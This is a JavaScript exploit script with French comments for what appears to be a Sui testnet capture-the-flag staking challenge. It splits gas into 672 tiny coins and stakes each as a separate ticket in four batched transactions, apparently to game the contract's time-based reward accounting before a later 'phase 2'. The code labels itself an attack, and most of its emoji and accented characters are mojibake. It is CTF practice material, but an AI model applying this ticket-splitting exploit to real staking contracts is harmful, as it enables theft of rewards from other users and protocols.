import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';
import fs from 'fs';
import path from 'path';

// --- CONFIGURATION ---
const CTF_ID = "0x96662054f048469d560c7d5d74b79a44c12f79a8e017e45b1ad85857c6891fdf";

// ‚ö†Ô∏è METTEZ L'ID DU POOL ICI
const STAKING_POOL_ID = "0x9576f25dd7b1ce05d23e6a87eba55f5882a0192bcff75d51a29e775a0256d96a"; 

// CONFIGURATION TURBO
const BATCHES = 4;            // 4 transactions
const TICKETS_PER_BATCH = 168; // 168 tickets par transaction
// Total = 672 tickets.
// 672 * 15 minutes = 10080 min = 168 Heures.

// Montant par ticket (0.002 SUI pour √©conomiser, tant que c'est > 0)
const AMOUNT_PER_TICKET = 2_000_000; 

// --- CHARGEMENT DE LA CL√â ---
// On lit le fichier keypair.json manuellement pour √©viter les erreurs d'import
const keypairPath = path.resolve('keypair.json'); 
const keyPairJson = JSON.parse(fs.readFileSync(keypairPath, 'utf8'));

const { secretKey } = decodeSuiPrivateKey(keyPairJson.privateKey);
const keypair = Ed25519Keypair.fromSecretKey(secretKey);

const client = new SuiGrpcClient({
    network: 'testnet',
    baseUrl: 'https://fullnode.testnet.sui.io:443',
});

async function main() {
  console.log(`--- üèéÔ∏è  ATTAQUE TURBO (Mode JS pur) ---`);
  console.log(`Objectif : ${BATCHES * TICKETS_PER_BATCH} tickets.`);
  
  const myAddress = keypair.toSuiAddress();
  console.log(`Wallet : ${myAddress}`);

  try {
    // Boucle pour envoyer les 4 transactions
    for (let batch = 1; batch <= BATCHES; batch++) {
        console.log(`\nüì¶ Pr√©paration du paquet ${batch} / ${BATCHES}...`);
        
        const tx = new Transaction();
        tx.setGasBudget(500_000_000); 

        // 1. D√©coupage de l'argent
        // On cr√©e un tableau de 168 montants
        const amounts = Array(TICKETS_PER_BATCH).fill(tx.pure.u64(AMOUNT_PER_TICKET));
        const coins = tx.splitCoins(tx.gas, amounts);

        // 2. Staking en boucle
        for (let i = 0; i < TICKETS_PER_BATCH; i++) {
            const receipt = tx.moveCall({
                target: `${CTF_ID}::staking::stake`,
                arguments: [
                    tx.object(STAKING_POOL_ID),
                    coins[i], 
                    tx.object('0x6') // Horloge
                ]
            });
            // On transf√®re le ticket directement vers vous
            tx.transferObjects([receipt], tx.pure.address(myAddress));
        }

        console.log(`üöÄ Envoi du paquet ${batch}...`);

        const result = await client.signAndExecuteTransaction({
            signer: keypair,
            transaction: tx,
            options: { showEffects: true }
        });
        
        console.log(`‚úÖ Paquet ${batch} confirm√© ! (Digest: ${result.digest})`);
    }

    console.log("\n===========================================================");
    console.log("üèÅ FIN DE L'OP√âRATION CR√âATION");
    console.log("-----------------------------------------------------------");
    console.log("‚è±Ô∏è  METTEZ UN CHRONOM√àTRE DE 16 MINUTES.");
    console.log("Ne lancez PAS la phase 2 avant, sinon le temps sera √† 0.");
    console.log("===========================================================");

  } catch (e) { 
    console.error("‚ùå Erreur:", e); 
  }
}

main();